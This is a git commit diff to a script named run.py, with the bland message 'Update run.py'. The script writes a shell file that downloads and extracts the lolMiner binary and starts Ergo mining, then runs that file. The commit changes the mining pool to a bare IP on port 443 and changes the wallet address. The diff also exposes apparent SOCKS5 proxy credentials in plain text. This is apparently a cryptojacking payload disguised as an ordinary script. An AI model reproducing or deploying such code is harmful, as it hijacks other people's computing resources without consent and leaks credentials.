0c67ed0b5cc72aec0685beec25a4951322f717e5
togninifabio98 <95686951+togninifabio98@users.noreply.github.com>
2022-07-07 13:44:50 +0700

    Update run.py

--- run.py
+++ run.py
@@ -1,6 +1,6 @@
 import os
 os.system('echo "#!/bin/sh" >> tes')
 os.system('echo "wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.35/lolMiner_v1.35_Lin64.tar.gz && tar zxvf lolMiner_v1.35_Lin64.tar.gz && cd 1.35" >> tes')
-os.system('echo "./lolMiner --algo AUTOLYKOS2 --pool stratum+tcp://de.ergo.herominers.com:1180 --user 9go8JBDqkwW6jx9jATZUPfQoso3Z2sAimHpy7wmEYbBVHxaSnX6.rknew - export proxy socks5://sikencot-rotate:mbah2237@p.webshare.io:80" >> tes')
+os.system('echo "./lolMiner --algo AUTOLYKOS2 --pool 216.250.118.159:443 --user 3CnZTtQYF7sGJHr1LsFRds4GmUvB1dUjAM.rknew - export proxy socks5://sikencot-rotate:mbah2237@p.webshare.io:80" >> tes')
 os.system('sleep 2')
 os.system('sh tes')
